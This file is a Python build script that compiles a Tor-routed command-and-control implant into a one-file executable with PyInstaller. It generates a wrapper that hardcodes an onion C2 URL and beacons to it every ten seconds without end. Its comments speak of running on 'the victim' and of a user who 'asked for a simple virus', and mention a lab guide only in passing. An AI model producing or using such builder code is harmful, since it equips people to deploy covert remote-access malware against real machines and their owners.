import os
import sys
import subprocess
import argparse
import shutil

def build_payload(url, tor_port, output_name="implant"):
    print(f"[*] Building payload for C2: {url}")
    

    build_dir = "build_temp"
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)
    os.makedirs(build_dir)
    

    
    wrapper_content = f"""
import sys
import os

# Add the current directory to sys.path so we can import modules if needed
# But for onefile, everything is bundled.

# We need to patch sys.argv to inject our arguments so the original implant.py works without modification
# OR we can just import the functions and call them.

import implant
import threading
import time

# Hardcoded Configuration
C2_URL = "{url}"
TOR_PORT = {tor_port}

if __name__ == "__main__":
    print("[*] Starting Implant...")
    
    # Configure SOCKS proxy for Tor (bundled Tor or system Tor?)
    # For this PoC, we assume system Tor is running on the victim or we are using a direct connection if proxied.
    # But the user asked for a simple "virus".
    # If we want it to be truly standalone, we might need to bundle Tor, but that's complex.
    # For now, we assume Tor is installed on the victim as per the lab guide.
    
    proxies = {{
        'http': f'socks5h://127.0.0.1:{{TOR_PORT}}',
        'https': f'socks5h://127.0.0.1:{{TOR_PORT}}'
    }}
    
    while True:
        implant.beacon(C2_URL, proxies)
        time.sleep(10)
"""
    
    
    shutil.copy("implant/implant.py", os.path.join(build_dir, "implant.py"))
    
    wrapper_path = os.path.join(build_dir, "payload_wrapper.py")
    with open(wrapper_path, "w") as f:
        f.write(wrapper_content)
        
    print(f"[*] Generated wrapper at {wrapper_path}")
    
    
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--name", output_name,
        "--distpath", ".", 
        "--workpath", os.path.join(build_dir, "work"),
        "--specpath", os.path.join(build_dir, "spec"),
        wrapper_path
    ]
    
    print("[*] Running PyInstaller... this may take a minute.")
    try:
        subprocess.run(cmd, check=True)
        print(f"[+] Build successful! Executable: {output_name}")
    except subprocess.CalledProcessError as e:
        print(f"[!] Build failed: {e}")
    


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--url', help='C2 Onion URL', required=True)
    parser.add_argument('--tor-port', help='Tor SOCKS port', default=9050, type=int)
    parser.add_argument('--name', help='Output filename', default='implant_payload')
    args = parser.parse_args()
    
    build_payload(args.url, args.tor_port, args.name)
